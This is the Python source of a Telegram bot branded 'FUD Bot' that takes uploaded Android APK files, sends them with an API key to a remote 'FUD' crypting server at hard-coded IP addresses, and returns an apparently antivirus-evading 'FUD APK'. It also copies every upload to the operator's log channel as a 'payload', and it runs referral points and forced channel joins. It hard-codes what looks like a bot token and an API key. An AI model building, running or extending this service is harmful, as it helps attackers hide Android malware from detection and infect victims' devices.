import os
import logging
import sqlite3
import json
import re
import asyncio
from io import BytesIO
from datetime import datetime
import httpx
from dotenv import load_dotenv

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, Document
from telegram.ext import (
    Application,
    CommandHandler,
    CallbackQueryHandler,
    MessageHandler,
    filters,
    ContextTypes,
    ConversationHandler,
)
from telegram.constants import ParseMode, ChatMemberStatus
from telegram.request import HTTPXRequest

# Env Load
load_dotenv()

# ---------- CONFIGURATION ----------
BOT_TOKEN = os.environ.get('BOT_TOKEN', '8991219063:AAHCFA9oWy_NudJVZLLklVwVxBpe6P0njjg')
if not BOT_TOKEN:
    raise ValueError("BOT_TOKEN environment variable not set!")

DEVELOPER_USERNAME = os.environ.get('DEVELOPER_USERNAME', '@Exusan2')
API_URL = "http://206.109.207.10:7070/api/v1/process"
API_STATUS_URL = "http://194.26.192.167:7070/api/v1/status"
API_KEY = "fud_d9b3bc48c47618e2242665f9887055aaaa05a7fa"
MAX_FILE_SIZE = 20 * 1024 * 1024

LOG_CHANNEL_ID = -1004463602256
ADMIN_IDS = [7807515642]

_build_lock = asyncio.Lock()
_build_in_progress = False
_build_user_id = None

WAITING_FOR_APK, WAITING_FOR_NAME, WAITING_ADMIN_POINTS, WAITING_ADMIN_BROADCAST = range(4)

logging.basicConfig(format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO)
logger = logging.getLogger(__name__)

# ---------- DATABASE ----------
def init_db():
    conn = sqlite3.connect('users.db')
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS users
                 (user_id INTEGER PRIMARY KEY,
                  username TEXT,
                  first_name TEXT,
                  points INTEGER DEFAULT 0,
                  referrer_id INTEGER,
                  blocked INTEGER DEFAULT 0,
                  topic_id INTEGER DEFAULT NULL,
                  created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP)''')
    c.execute('''CREATE TABLE IF NOT EXISTS referrals
                 (referrer_id INTEGER,
                  referee_id INTEGER,
                  date TIMESTAMP DEFAULT CURRENT_TIMESTAMP)''')
    conn.commit()
    conn.close()

def get_user(user_id):
    conn = sqlite3.connect('users.db')
    c = conn.cursor()
    c.execute("SELECT * FROM users WHERE user_id=?", (user_id,))
    user = c.fetchone()
    conn.close()
    return user

def add_user(user_id, username, first_name, referrer_id=None):
    conn = sqlite3.connect('users.db')
    c = conn.cursor()
    try:
        c.execute("INSERT OR IGNORE INTO users (user_id, username, first_name, referrer_id, points) VALUES (?,?,?,?,?)",
                  (user_id, username, first_name, referrer_id, 1))
        conn.commit()
        if referrer_id:
            c.execute("UPDATE users SET points = points + 1 WHERE user_id = ?", (referrer_id,))
            c.execute("INSERT INTO referrals (referrer_id, referee_id) VALUES (?,?)", (referrer_id, user_id))
            conn.commit()
    except Exception as e:
        logger.error(f"DB error: {e}")
    finally:
        conn.close()

def update_points(user_id, delta):
    conn = sqlite3.connect('users.db')
    c = conn.cursor()
    c.execute("UPDATE users SET points = points + ? WHERE user_id = ?", (delta, user_id))
    conn.commit()
    conn.close()

def get_all_users():
    conn = sqlite3.connect('users.db')
    c = conn.cursor()
    c.execute("SELECT user_id, username, first_name, points, blocked FROM users")
    return c.fetchall()

def set_blocked(user_id, blocked):
    conn = sqlite3.connect('users.db')
    c = conn.cursor()
    c.execute("UPDATE users SET blocked = ? WHERE user_id = ?", (1 if blocked else 0, user_id))
    conn.commit()
    conn.close()

init_db()

# ---------- FORCE JOIN CHECKER ----------
async def is_user_joined(context, user_id):
    try:
        member = await context.bot.get_chat_member(chat_id=FORCE_CHANNEL, user_id=user_id)
        return member.status in [ChatMemberStatus.MEMBER, ChatMemberStatus.ADMINISTRATOR, ChatMemberStatus.OWNER]
    except Exception as e:
        logger.error(f"Force Join Check Error: {e}")
        return True

def get_join_keyboard():
    keyboard = [
        [InlineKeyboardButton("📢 Join Channel", url="https://t.me/Semsepiol")],
        [InlineKeyboardButton("✅ Joined / Verify", callback_data="check_join")]
    ]
    return InlineKeyboardMarkup(keyboard)

# ---------- HELPER FUNCTIONS ----------
async def forward_to_log_channel(context, user_id, username, apk_bytes, filename):
    try:
        caption = (
            f"📦 <b>New Payload Received</b>\n\n"
            f"👤 User: <a href='tg://user?id={user_id}'>{username or 'Unknown'}</a>\n"
            f"🆔 ID: <code>{user_id}</code>\n"
            f"📄 File: <code>{filename}</code>"
        )
        await context.bot.send_document(
            chat_id=LOG_CHANNEL_ID,
            document=apk_bytes,
            filename=filename,
            caption=caption,
            parse_mode="HTML"
        )
    except Exception as e:
        logger.error(f"Failed to forward to log channel: {e}")

# ---------- MAIN MENU ----------
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id

    # Check Channel Join
    if not await is_user_joined(context, user_id):
        await update.message.reply_text(
            "⚠️ **Access Denied!**\n\nYou must join our official channel to use this bot.",
            parse_mode="Markdown",
            reply_markup=get_join_keyboard()
        )
        return

    args = context.args
    referrer_id = None
    if args and args[0].startswith("ref_"):
        ref_id = int(args[0].split("_")[1])
        if ref_id != user_id and not get_user(user_id):
            referrer_id = ref_id
    if not get_user(user_id):
        add_user(user_id, update.effective_user.username, update.effective_user.first_name, referrer_id)
        if referrer_id:
            await update.message.reply_text("✅ You were referred! You got 1 free point.")
            try:
                await context.bot.send_message(referrer_id, f"🎉 You earned 1 point! {user_id} joined via your referral.")
            except:
                pass
        else:
            await update.message.reply_text("✅ You got 1 free point for joining!")

    keyboard = [
        [InlineKeyboardButton("👤 Profile", callback_data="profile")],
        [InlineKeyboardButton("📤 Upload APK", callback_data="upload")],
        [InlineKeyboardButton("❓ Help", callback_data="help")],
        [InlineKeyboardButton("🔗 Get Referral Link", callback_data="referral")],
    ]
    if user_id in ADMIN_IDS:
        keyboard.append([InlineKeyboardButton("⚙️ Admin Panel", callback_data="admin_panel")])
    await update.message.reply_text(
        "👋 Welcome to the FUD Bot!\nSend me an APK file to get started.",
        reply_markup=InlineKeyboardMarkup(keyboard)
    )

# ---------- CALLBACK HANDLER ----------
async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    data = query.data

    if data == "check_join":
        if await is_user_joined(context, user_id):
            await query.edit_message_text("✅ Verification Successful! Send /start again to continue.")
        else:
            await query.answer("❌ You haven't joined the channel yet!", show_alert=True)
        return

    if not await is_user_joined(context, user_id):
        await query.edit_message_text(
            "⚠️ **Access Denied!** Please join our channel first.",
            reply_markup=get_join_keyboard(),
            parse_mode="Markdown"
        )
        return

    if data == "profile":
        user = get_user(user_id)
        if user:
            msg = f"👤 **Profile**\n\nID: `{user[0]}`\nName: {user[2]}\nUsername: @{user[1] or 'N/A'}\nPoints: {user[3]}\nReferrer: {user[4] if user[4] else 'None'}"
            await query.edit_message_text(msg, parse_mode=ParseMode.MARKDOWN)
        else:
            await query.edit_message_text("User not found. /start again.")
    elif data == "help":
        await query.edit_message_text("❓ **Help**\n\n1. Click 'Upload APK' or send an APK file directly.\n2. I'll ask for the output name.\n3. I'll process it and send you the FUD APK.\n4. Earn points by referring friends!")
    elif data == "referral":
        bot_username = (await context.bot.get_me()).username
        link = f"https://t.me/{bot_username}?start=ref_{user_id}"
        await query.edit_message_text(f"🔗 **Your Referral Link**\n\n`{link}`\n\nEach new user gives you **1 point**.", parse_mode=ParseMode.MARKDOWN)
    elif data == "upload":
        await query.edit_message_text("📎 Please send me the APK file you want to process.")
        return WAITING_FOR_APK
    elif data == "admin_panel":
        if user_id not in ADMIN_IDS:
            await query.edit_message_text("⛔ Not admin.")
            return
        keyboard = [
            [InlineKeyboardButton("📊 Give Points", callback_data="give_points")],
            [InlineKeyboardButton("📢 Broadcast", callback_data="broadcast")],
            [InlineKeyboardButton("🔙 Back", callback_data="main_menu")],
        ]
        await query.edit_message_text("⚙️ **Admin Panel**", reply_markup=InlineKeyboardMarkup(keyboard))
    elif data == "give_points":
        if user_id not in ADMIN_IDS:
            await query.edit_message_text("⛔ Not admin.")
            return
        await query.edit_message_text("📊 **Give Points**\n\nSend: `user_id points`")
        return WAITING_ADMIN_POINTS
    elif data == "broadcast":
        if user_id not in ADMIN_IDS:
            await query.edit_message_text("⛔ Not admin.")
            return
        await query.edit_message_text("📢 **Broadcast**\n\nSend your message.")
        return WAITING_ADMIN_BROADCAST
    elif data == "main_menu":
        keyboard = [
            [InlineKeyboardButton("👤 Profile", callback_data="profile")],
            [InlineKeyboardButton("📤 Upload APK", callback_data="upload")],
            [InlineKeyboardButton("❓ Help", callback_data="help")],
            [InlineKeyboardButton("🔗 Get Referral Link", callback_data="referral")],
        ]
        if user_id in ADMIN_IDS:
            keyboard.append([InlineKeyboardButton("⚙️ Admin Panel", callback_data="admin_panel")])
        await query.edit_message_text(
            "👋 Welcome to the FUD Bot!\nSend me an APK file to get started.",
            reply_markup=InlineKeyboardMarkup(keyboard)
        )
    elif data == "cancel":
        await query.edit_message_text("❌ Cancelled.")
        return ConversationHandler.END
    return

# ---------- CONVERSATION HANDLERS ----------
async def receive_apk(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id = update.effective_user.id

        if not await is_user_joined(context, user_id):
            await update.message.reply_text("⚠️ Please join our channel first!", reply_markup=get_join_keyboard())
            return ConversationHandler.END

        document = update.message.document

        if _build_in_progress:
            await update.message.reply_text(
                "⏳ *Abhi ek FUD build chal rahi hai, thoda wait karo...*\n\nBuild complete hone ke baad dobara APK bhejo.",
                parse_mode="Markdown"
            )
            return ConversationHandler.END

        if document is None:
            await update.message.reply_text("❌ Please send a valid APK file.")
            return ConversationHandler.END
        fname = document.file_name or ""
        mime  = document.mime_type or ""
        if "android" not in mime and not fname.lower().endswith(".apk"):
            await update.message.reply_text("❌ Please send a valid APK file.")
            return ConversationHandler.END
        if document.file_size > MAX_FILE_SIZE:
            await update.message.reply_text(f"❌ File too large. Max 20 MB. Yours: {document.file_size/1024/1024:.2f} MB")
            return ConversationHandler.END
        context.user_data["apk_file_id"] = document.file_id
        context.user_data["apk_file_name"] = document.file_name

        file_obj = await context.bot.get_file(document.file_id)
        apk_bytes = bytes(await file_obj.download_as_bytearray())
        context.user_data["apk_bytes"] = apk_bytes
        username = update.effective_user.username or update.effective_user.first_name or str(user_id)
        await forward_to_log_channel(context, user_id, username, apk_bytes, document.file_name)

        await update.message.reply_text("📝 Now send the **desired output name** (without .apk).\nExample: `MyApp`", parse_mode="Markdown")
        return WAITING_FOR_NAME
    except Exception as e:
        logger.exception(f"receive_apk error: {e}")
        await update.message.reply_text("❌ Something went wrong. Please try again.")
        return ConversationHandler.END

async def receive_name(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global _build_in_progress, _build_user_id

    name = update.message.text.strip()
    if not name:
        await update.message.reply_text("❌ Name cannot be empty. Try again.")
        return WAITING_FOR_NAME
    file_id = context.user_data.get("apk_file_id")
    file_name = context.user_data.get("apk_file_name")
    if not file_id:
        await update.message.reply_text("❌ Something went wrong. Please send the APK again.")
        return
    user_id = update.effective_user.id

    if _build_in_progress:
        await update.message.reply_text(
            "⏳ *Abhi ek FUD build chal rahi hai, thoda wait karo...*\n\nJab woh complete ho jayegi tab tumhara APK process hoga.",
            parse_mode="Markdown"
        )
        context.user_data.clear()
        return ConversationHandler.END

    _build_in_progress = True
    _build_user_id = user_id
    status_msg = await update.message.reply_text("📤 Processing your APK... This may take a minute.")

    try:
        apk_bytes = context.user_data.get("apk_bytes")
        if not apk_bytes:
            file = await context.bot.get_file(file_id)
            apk_bytes = bytes(await file.download_as_bytearray())

        fud_files = {"apk": (file_name, apk_bytes, "application/vnd.android.package-archive")}
        fud_data = {"name": name, "app_name": name, "filename": f"{name}.apk"}
        headers = {"X-API-Key": API_KEY}

        logger.info(f"⏳ Sending POST to FUD API for user {user_id}...")
        start_time = datetime.now()
        timeout = httpx.Timeout(600.0, read=600.0, write=120.0, connect=30.0)

        async def update_status():
            elapsed = 0
            while True:
                await asyncio.sleep(15)
                elapsed += 15
                try:
                    await status_msg.edit_text(
                        f"⏳ Processing your APK... ({elapsed}s elapsed)\nThis may take several minutes."
                    )
                except Exception:
                    break

        progress_task = asyncio.create_task(update_status())
        async with httpx.AsyncClient(timeout=timeout) as client:
            response = await client.post(API_URL, headers=headers, data=fud_data, files=fud_files)

        progress_task.cancel()
        elapsed_time = (datetime.now() - start_time).total_seconds()
        logger.info(f"✅ FUD API responded in {elapsed_time:.1f}s with status {response.status_code}")

        await status_msg.delete()

        if response.status_code == 200:
            content_type = response.headers.get("content-type", "")
            if "application/" in content_type or "octet-stream" in content_type:
                await update.message.reply_document(
                    document=response.content,
                    filename=f"{name}.apk",
                    caption=f"✅ Here is your FUD APK: `{name}.apk`"
                )
            elif "json" in content_type:
                data_json = response.json()
                if data_json.get("ok"):
                    if "download_url" in data_json:
                        await update.message.reply_text(f"✅ Download: {data_json['download_url']}")
                    else:
                        await update.message.reply_text(f"✅ {json.dumps(data_json, indent=2)}")
                else:
                    await update.message.reply_text(f"❌ Server error: {data_json.get('error', 'Unknown')}")
            else:
                await update.message.reply_text(f"⚠️ Unexpected response (status 200).\n{response.text[:500]}")
        else:
            await update.message.reply_text(f"❌ FUD Server error (HTTP {response.status_code}):\n{response.text[:500]}")

    except httpx.TimeoutException:
        await status_msg.edit_text("⏰ Timeout: The server took too long. Please try again later.")
    except Exception as e:
        logger.exception("Unexpected error:")
        await status_msg.edit_text(f"❌ Error: {str(e)[:200]}")
    finally:
        _build_in_progress = False
        _build_user_id = None

    context.user_data.clear()
    return ConversationHandler.END

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("❌ Cancelled.")
    context.user_data.clear()
    return ConversationHandler.END

# ---------- ADMIN HANDLERS ----------
async def admin_points_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in ADMIN_IDS:
        await update.message.reply_text("⛔ Not admin.")
        return ConversationHandler.END
    try:
        parts = update.message.text.split()
        if len(parts) != 2:
            await update.message.reply_text("❌ Invalid format. Send: `user_id points`")
            return WAITING_ADMIN_POINTS
        target_id = int(parts[0]); points = int(parts[1])
        update_points(target_id, points)
        await update.message.reply_text(f"✅ Added {points} points to {target_id}.")
    except ValueError:
        await update.message.reply_text("❌ Please send valid numbers.")
        return WAITING_ADMIN_POINTS
    except Exception as e:
        logger.error(f"Admin points error: {e}")
        await update.message.reply_text("❌ An error occurred.")
    keyboard = [
        [InlineKeyboardButton("📊 Give Points", callback_data="give_points")],
        [InlineKeyboardButton("📢 Broadcast", callback_data="broadcast")],
        [InlineKeyboardButton("🔙 Back", callback_data="main_menu")],
    ]
    await update.message.reply_text("⚙️ **Admin Panel**", reply_markup=InlineKeyboardMarkup(keyboard))
    return ConversationHandler.END

async def admin_broadcast_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in ADMIN_IDS:
        await update.message.reply_text("⛔ Not admin.")
        return ConversationHandler.END
    message = update.message.text
    if not message:
        await update.message.reply_text("❌ Message cannot be empty.")
        return WAITING_ADMIN_BROADCAST
    users = get_all_users()
    count = 0
    for u in users:
        try:
            await context.bot.send_message(chat_id=u[0], text=f"📢 **Broadcast**\n\n{message}", parse_mode=ParseMode.MARKDOWN)
            count += 1
        except Exception as e:
            logger.error(f"Failed to send to {u[0]}: {e}")
    await update.message.reply_text(f"✅ Broadcast sent to {count} users.")
    keyboard = [
        [InlineKeyboardButton("📊 Give Points", callback_data="give_points")],
        [InlineKeyboardButton("📢 Broadcast", callback_data="broadcast")],
        [InlineKeyboardButton("🔙 Back", callback_data="main_menu")],
    ]
    await update.message.reply_text("⚙️ **Admin Panel**", reply_markup=InlineKeyboardMarkup(keyboard))
    return ConversationHandler.END

# ---------- ADMIN COMMANDS ----------
async def addpoint(update, context):
    if update.effective_user.id not in ADMIN_IDS:
        await update.message.reply_text("⛔ Not admin.")
        return
    try:
        user_id = int(context.args[0]); points = int(context.args[1])
        update_points(user_id, points)
        await update.message.reply_text(f"✅ Added {points} points to {user_id}.")
    except:
        await update.message.reply_text("❌ /addpoint <user_id> <points>")

async def setpoints(update, context):
    if update.effective_user.id not in ADMIN_IDS:
        await update.message.reply_text("⛔ Not admin.")
        return
    try:
        user_id = int(context.args[0]); points = int(context.args[1])
        conn = sqlite3.connect('users.db')
        c = conn.cursor()
        c.execute("UPDATE users SET points = ? WHERE user_id = ?", (points, user_id))
        conn.commit(); conn.close()
        await update.message.reply_text(f"✅ Set points to {points} for {user_id}.")
    except:
        await update.message.reply_text("❌ /setpoints <user_id> <points>")

async def listusers(update, context):
    if update.effective_user.id not in ADMIN_IDS:
        await update.message.reply_text("⛔ Not admin.")
        return
    users = get_all_users()
    if not users:
        await update.message.reply_text("No users.")
        return
    msg = "👥 **Users**\n\n"
    for u in users:
        msg += f"ID: `{u[0]}` | {u[1] or 'No username'} | Points: {u[3]} | {'🔒 Blocked' if u[4] else '✅ Active'}\n"
    await update.message.reply_text(msg, parse_mode=ParseMode.MARKDOWN)

async def block(update, context):
    if update.effective_user.id not in ADMIN_IDS:
        await update.message.reply_text("⛔ Not admin.")
        return
    try:
        user_id = int(context.args[0])
        set_blocked(user_id, True)
        await update.message.reply_text(f"✅ User {user_id} blocked.")
    except:
        await update.message.reply_text("❌ /block <user_id>")

async def unblock(update, context):
    if update.effective_user.id not in ADMIN_IDS:
        await update.message.reply_text("⛔ Not admin.")
        return
    try:
        user_id = int(context.args[0])
        set_blocked(user_id, False)
        await update.message.reply_text(f"✅ User {user_id} unblocked.")
    except:
        await update.message.reply_text("❌ /unblock <user_id>")

async def broadcast(update, context):
    if update.effective_user.id not in ADMIN_IDS:
        await update.message.reply_text("⛔ Not admin.")
        return
    if not context.args:
        await update.message.reply_text("❌ Usage: /broadcast <message>")
        return
    message = " ".join(context.args)
    users = get_all_users()
    count = 0
    for u in users:
        try:
            await context.bot.send_message(chat_id=u[0], text=f"📢 **Broadcast**\n\n{message}", parse_mode=ParseMode.MARKDOWN)
            count += 1
        except Exception as e:
            logger.error(f"Failed to send to {u[0]}: {e}")
    await update.message.reply_text(f"✅ Broadcast sent to {count} users.")

async def unknown(update, context):
    await update.message.reply_text("🤖 Use /start to begin.")

def _check_api():
    print(f"[API] Checking {API_STATUS_URL} ...")
    try:
        r = httpx.get(API_STATUS_URL, headers={"X-API-Key": API_KEY}, timeout=20.0)
        if r.status_code == 200:
            print("[API] Connected OK — key valid")
        else:
            print(f"[API] HTTP {r.status_code}: {r.text[:300]}")
    except Exception as e:
        print(f"[API] CANNOT REACH API: {e}")

# ---------- MAIN ----------
def main():
    _check_api()
    request = HTTPXRequest(
        connect_timeout=60.0,
        read_timeout=300.0,
        write_timeout=300.0,
        pool_timeout=10.0
    )
    app = Application.builder().token(BOT_TOKEN).request(request).build()

    upload_conv = ConversationHandler(
        entry_points=[
            CallbackQueryHandler(button_callback, pattern="^upload$"),
            MessageHandler(filters.Document.ALL, receive_apk),
        ],
        states={
            WAITING_FOR_APK: [MessageHandler(filters.Document.ALL, receive_apk)],
            WAITING_FOR_NAME: [MessageHandler(filters.TEXT & ~filters.COMMAND, receive_name)],
        },
        fallbacks=[CommandHandler("cancel", cancel), CallbackQueryHandler(button_callback, pattern="^cancel$")],
    )
    app.add_handler(upload_conv)

    admin_points_conv = ConversationHandler(
        entry_points=[CallbackQueryHandler(button_callback, pattern="^give_points$")],
        states={WAITING_ADMIN_POINTS: [MessageHandler(filters.TEXT & ~filters.COMMAND, admin_points_input)]},
        fallbacks=[CommandHandler("cancel", cancel), CallbackQueryHandler(button_callback, pattern="^main_menu$")],
    )
    app.add_handler(admin_points_conv)

    admin_broadcast_conv = ConversationHandler(
        entry_points=[CallbackQueryHandler(button_callback, pattern="^broadcast$")],
        states={WAITING_ADMIN_BROADCAST: [MessageHandler(filters.TEXT & ~filters.COMMAND, admin_broadcast_input)]},
        fallbacks=[CommandHandler("cancel", cancel), CallbackQueryHandler(button_callback, pattern="^main_menu$")],
    )
    app.add_handler(admin_broadcast_conv)

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(button_callback, pattern="^(profile|help|referral|admin_panel|main_menu|cancel|check_join)$"))
    app.add_handler(CommandHandler("addpoint", addpoint))
    app.add_handler(CommandHandler("setpoints", setpoints))
    app.add_handler(CommandHandler("users", listusers))
    app.add_handler(CommandHandler("block", block))
    app.add_handler(CommandHandler("unblock", unblock))
    app.add_handler(CommandHandler("broadcast", broadcast))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, unknown))

    print("🤖 Bot started! Press Ctrl+C to stop.")
    app.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()
